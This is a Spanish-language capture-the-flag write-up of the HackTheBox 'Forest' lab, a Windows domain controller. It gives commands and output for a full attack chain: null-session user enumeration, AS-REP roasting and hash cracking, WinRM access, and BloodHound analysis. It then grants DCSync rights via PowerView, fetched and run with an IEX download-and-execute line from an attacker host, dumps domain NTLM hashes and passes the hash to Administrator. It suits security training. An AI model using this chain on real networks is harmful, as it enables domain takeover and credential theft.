---
title: Forest Writeup - HackTheBox
date: 2023-07-30
categories: [Writeups, HTB]
tags: [Windows, HTB, CTF, Easy, RPC, Hash Cracking, WinRM, BloodHound, WriteDacl, DCSync]
img_path: /assets/img/commons/forest/
image: forest.png
---

¡Saludos!

En este writeup, nos sumergiremos en la máquina [**Forest**](https://app.hackthebox.com/machines/212) de **HackTheBox**, la cual está calificada con un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Windows** en la que realizaremos una **enumeración RPC** para recopilar información sobre los usuarios del dominio, lo que nos permitirá llevar a cabo el ataque **AS-RepRoast** y, finalmente, descifrar la contraseña de un usuario comprometido. Esto nos otorgará acceso al sistema a través de **WinRM**. Para la escalada de privilegios, llevaremos a cabo una exploración exhaustiva del dominio utilizando herramientas como **BloodHound** y **SharpHound** para identificar una posible vía de compromiso que nos permita elevar nuestros privilegios hasta convertirnos en Administrador, utilizando técnicas como **WriteDacl** y **DCSync**.

¡Vamos a empezar!


## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.10.161
PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=108 ms

--- 10.10.10.161 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 107.611/107.611/107.611/0.000 ms
```

Dado que el `TTL` es cercano a `128`, podemos inferir que la máquina objetivo probablemente sea Windows.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.10.161 -oG allPorts.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-30 15:26 -05
Nmap scan report for 10.10.10.161
Host is up (0.11s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49957/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49957 -sVC --min-rate 5000 10.10.10.161 -oN services.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-30 15:31 -05
Nmap scan report for 10.10.10.161
Host is up (0.14s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-30 20:38:17Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  @            Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49957/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-30T20:39:10
|_  start_date: 2023-07-30T13:09:15
|_clock-skew: mean: 2h26m48s, deviation: 4h02m29s, median: 6m47s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-07-30T13:39:08-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.41 seconds
```

Segun el reporte y los puertos identificados la máquina parece ser un controlador de dominio para el dominio `htb.local`.

```bash
❯ echo "10.10.10.161\thtb.local" >> /etc/hosts
```

### RPC - 135

Realizamos una enumeración de recurso compartidos con una session nula, pero no encontramos ningún recurso compartido. Posteriormente intentamos realizar una enumeración de usuarios del dominio empleando `rpcclient` y una session nula:

```bash
❯ rpcclient -U "" 10.10.10.161 -N -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[ammar] rid:[0x2581] 
```

Empleamos el siguiente comando para extraer únicamente los usuarios.

```bash
❯ rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP "\[.*?\]" | grep -v 0x | tr -d "[]" > users.txt
```

## Explotación

---

### AS-RepRoast attack

Ahora que disponemos de una lista de usuarios de dominio, estamos en posición de llevar a cabo el ataque conocido como "AS-REP Roasting". Para ejecutar este tipo de ataque, es necesario que una cuenta tenga la propiedad "No requerir autenticación previa de Kerberos" o `UF_DONT_REQUIRE_PREAUTH` establecida en "true".

El siguiente paso es solicitar el Ticket Granting Ticket (TGT) cifrado para ese usuario en particular. Dado que el TGT contiene información cifrada utilizando el hash NTLM del usuario, podemos someterlo a un ataque de fuerza bruta offline con el objetivo de intentar obtener la contraseña.

Un script útil para llevar a cabo esta tarea es [GetNPUsers.py](http://getnpusers.py/) de Impacket, que permite solicitar un ticket TGT y volcar el hash correspondiente.

```bash
❯ /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -no-pass -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:4e5353a2c9d31f672b1a21cc000d099d$f9ce293ab972c31a28b8a1bacad71be32b8369654c83664b78fafd116e7ab270f286291f6524cfb9683bf988eae7de7d5ef3bc45f9a026fcc174c57c9dff632ab14bd6b5737f11b298139d5d78ea817633c866b4c2297c54ca46a9062ec6ab3bf252864caac62fa8b4119cc91fa01a109b545086705ee05f3a643763ab6f682e2b683e2cb926a8f56f7fe61c4b1d85f8de4894e6040bd5b08618880cdc664a68851bca42e484c896824b541846c3a7eafa143fd8ee446951a4fce38e5165758292bee55ffe531a588efc4f80a535fdcef08309051970b43f35ab4085e0408299d12d130d7b99
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ammar doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Hemos obtenido el hash del usuario `svc-alfresco`. Ahora, procederemos a copiarlo en un archivo y luego intentaremos descifrarlo utilizando la herramienta **JohnTheRipper**.

```bash
❯ echo '$krb5asrep$23$svc-alfresco@HTB.LOCAL:4e5353a2c9d31f672b1a21cc000d099d$f9ce293ab972c31a28b8a1bacad71be32b8369654c83664b78fafd116e7ab270f286291f6524cfb9683bf988eae7de7d5ef3bc45f9a026fcc174c57c9dff632ab14bd6b5737f11b298139d5d78ea817633c866b4c2297c54ca46a9062ec6ab3bf252864caac62fa8b4119cc91fa01a109b545086705ee05f3a643763ab6f682e2b683e2cb926a8f56f7fe61c4b1d85f8de4894e6040bd5b08618880cdc664a68851bca42e484c896824b541846c3a7eafa143fd8ee446951a4fce38e5165758292bee55ffe531a588efc4f80a535fdcef08309051970b43f35ab4085e0408299d12d130d7b99' > hash.txt
```

```bash
❯ john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:03 DONE (2023-07-30 16:45) 0.2932g/s 1198Kp/s 1198Kc/s 1198KC/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La contraseña de esta cuenta es `s3rvice`. Dado que el puerto `5985` también está abierto, podemos verificar si este usuario tiene permitido el acceso remoto a través de WinRM utilizando **Evil-WinRM**.

```bash
❯ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Como se puede observar, el usuario `svc-alfresco` tiene la autorización para el acceso remoto a través de WinRM, por lo que procedemos a iniciar sesión.

```bash
❯ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

Ahora que hemos accedido al sistema, podemos proceder a leer la flag de usuario.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
d5b32f79529355cd****************
```

## Escalación de privilegios

---

### Enumeración con BloodHound

Para avanzar en la exploración del dominio y buscar rutas de escalada de privilegios, el siguiente paso es ejecutar [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) para recopilar datos que luego se utilizarán en [BloodHound](https://github.com/BloodHoundAD/BloodHound). Para hacerlo, debemos cargar el archivo SharpHound.exe utilizando la sesión de Evil-WinRM que ya hemos establecido.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\BloodHound> upload /home/juanr/CTF/HTB/Forest/content/SharpHound.exe .
                                        
Info: Uploading /home/juanr/CTF/HTB/Forest/content/SharpHound.exe to C:\Users\svc-alfresco\Desktop\BloodHound\.
                                        
Data: 1395368 bytes of 1395368 bytes copied
                                        
Info: Upload successful!
```

Lo ejecutamos.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\BloodHound> .\Sharphound.exe --CollectionMethods All
2023-07-30T16:48:02.7633163-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-07-30T16:48:02.9194639-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-07-30T16:48:02.9507140-07:00|INFORMATION|Initializing SharpHound at 4:48 PM on 7/30/2023
2023-07-30T16:48:03.1382200-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2023-07-30T16:48:03.2633768-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-07-30T16:48:03.6493402-07:00|INFORMATION|Beginning LDAP search for htb.local
2023-07-30T16:48:03.8055489-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-07-30T16:48:03.8055489-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-07-30T16:48:34.0026206-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 42 MB RAM
2023-07-30T16:48:48.9025684-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-07-30T16:48:49.0431891-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-07-30T16:48:49.3713065-07:00|INFORMATION|Status: 162 objects finished (+162 3.6)/s -- Using 47 MB RAM
2023-07-30T16:48:49.3713065-07:00|INFORMATION|Enumeration finished in 00:00:45.7155633
2023-07-30T16:48:49.6369426-07:00|INFORMATION|Saving cache with stats: 119 ID to type mappings.
 119 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-07-30T16:48:49.6681935-07:00|INFORMATION|SharpHound Enumeration Completed at 4:48 PM on 7/30/2023! Happy Graphing!
```

Y obtenemos un archivo `zip`.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\BloodHound> dir

    Directory: C:\Users\svc-alfresco\Desktop\BloodHound

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/30/2023   4:48 PM          18880 20230730164846_BloodHound.zip
-a----        7/30/2023   4:48 PM          19744 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        7/30/2023   4:46 PM        1046528 SharpHound.exe
```

Descargamos el archivo `zip` a nuestra maquina atacante.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\BloodHound> download C:\Users\svc-alfresco\Desktop\BloodHound\20230730164846_BloodHound.zip .
                                        
Info: Downloading C:\Users\svc-alfresco\Desktop\BloodHound\20230730164846_BloodHound.zip to 20230730164846_BloodHound.zip
                                        
Info: Download successful!
```

Ejecuto el siguiente comando para administrar y gestionar una base de datos `Neo4j`.

```bash
❯ neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.

[...]
```

Con este comando iniciamos la interfaz gráfica de usuario (GUI) de BloodHound.

```bash
❯ bloodhound --no-sandbox
(node:160475) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:160523) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
```

Introducimos las credenciales correspondientes.

![login](login.png)

Cargamos los datos del archivo `zip` que contiene los resultados recopilados por SharpHound.

![upload](upload.png)

Marcamos al usuario `svc-alfresco` como comprometido, ya que hemos obtenido control sobre la cuenta.

![svc-alfresco](svc-alfresco.png)

![svc-alfresco2](svc-alfresco2.png)

A partir del usuario `svc-alfresco`, seleccionamos "Objetivos de alto valor alcanzables".

![svc-alfresco3](svc-alfresco3.png)

Claramente, podemos observar que el usuario `svc-alfresco` es parte del grupo "**SERVICE ACCOUNTS**". A su vez, este grupo es miembro del grupo "**PRIVILEGED IT ACCOUNTS**", y este último grupo pertenece al grupo "**ACCOUNT OPERATORS**". En resumen, el usuario `svc-alfresco` es miembro del grupo **PRIVILEGED IT ACCOUNTS**.

![svc-alfresco4](svc-alfresco4.png)

A partir del grupo **ACCOUNT OPERATORS**, seleccionamos "Objetivos de alto valor alcanzables".

![account](account.png)

Podemos observar que los miembros del grupo **ACCOUNT OPERATORS** tiene el control total sobre el grupo **EXCHANGE WINDOWS PERMISSIONS**.

La principal vulnerabilidad aquí es que Exchange tiene altos privilegios en el dominio de Active Directory. El grupo **EXCHANGE WINDOWS PERMISSIONS** tiene acceso **WriteDacl** sobre el objeto Domain en Active Directory, lo que permite a cualquier miembro de este grupo modificar los privilegios del dominio, entre los que se encuentra el privilegio de realizar operaciones **DCSync**. Los usuarios o equipos con este privilegio pueden realizar operaciones de sincronización que normalmente utilizan los Controladores de Dominio para replicarse, lo que permite a los atacantes sincronizar todas las contraseñas hash de los usuarios del Directorio Activo.

![account2](account2.png)

También podemos hacer clic en **WriteDacl** y luego seleccionar "**Help**" para obtener información sobre esta vulnerabilidad, así como un ejemplo de cómo explotarla.

![WriteDacl](WriteDacl.png)

![WriteDacl2](WriteDacl2.png)

Creamos un nuevo usuario y lo agregamos al grupo "Exchange Windows Permissions".

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user john password123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" john /add
The command completed successfully.
```

Para llevar a cabo este ataque, es necesario descargar [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) y ejecutarlo en la máquina víctima.

Entonces, procedemos a crear un servidor con Python.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Luego, descargamos y ejecutamos el script de PowerShell desde la URL atacante.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.149/PowerView.ps1')
```

Ahora podemos ejecutar los siguientes comandos para otorgar al usuario `john` el derecho **DCSync** en el dominio "**DC=htb,DC=local**".

```bash

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\john', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity john -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync
```

Ahora podemos utilizar el script `secretsdump.py` de Impacket, ejecutándolo como `john`, para revelar los hashes NTLM de todos los usuarios del dominio.

```bash
❯ python2 /opt/impacket-0.9.19/examples/secretsdump.py htb.local/john@10.10.10.161
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[...]
```

Verificamos con el hash del usuario `Administrator` si podemos establecer una sesión con WinRM.

```bash
❯ crackmapexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```

Habiendo confirmado que es posible, procedemos a acceder como usuario `Administrator` utilizando **Evil-WinRM**.

```bash
❯ evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

Finalmente, accedemos a la flag de root.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
cea91b219c210709****************
```

!Happy Hacking¡
